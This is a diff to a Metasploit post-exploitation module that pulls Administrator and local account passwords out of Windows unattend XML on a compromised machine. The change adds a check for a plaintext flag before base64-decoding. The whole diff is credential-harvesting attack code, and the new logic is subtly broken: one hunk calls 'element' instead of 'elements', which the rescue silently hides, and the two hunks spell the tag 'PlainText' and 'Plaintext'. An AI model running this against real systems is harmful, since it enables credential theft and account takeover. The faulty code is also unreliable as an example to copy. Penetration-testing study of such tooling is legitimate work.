@@ -99,8 +99,14 @@ class Metasploit3 < Msf::Post
 					'Columns' => ['Username', 'Password']
 				})
 
-				password = Rex::Text.decode_base64(node.elements['Value'].get_text) rescue ''
-				password = password.gsub(/#{Rex::Text.to_unicode('AdministratorPassword')}$/, '')
+				password = node.elements['Value'].get_text rescue ''
+				plaintext = node.element['PlainText'].get_text rescue 'false'
+
+				if plaintext == 'false'
+					password = Rex::Text.decode_base64(password)
+					password = password.gsub(/#{Rex::Text.to_unicode('AdministratorPassword')}$/, '')
+				end
+
 				if not password.empty?
 					table << ['Administrator', password]
 					cred_tables << table
@@ -137,8 +143,14 @@ class Metasploit3 < Msf::Post
 				})
 
 				node.elements.each do |local|
-					password = Rex::Text.decode_base64(local.elements['Password/Value'].get_text) rescue ''
-					password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
+					password = local.elements['Password/Value'].get_text rescue ''
+					plaintext = local.elements['Password/Plaintext'].get_text rescue 'false'
+
+					if plaintext == 'false'
+						password = Rex::Text.decode_base64(password)
+						password = password.gsub(/#{Rex::Text.to_unicode('Password')}$/, '')
+					end
+
 					username = local.elements['Name'].get_text rescue ''
 					table << [username, password]
 				end
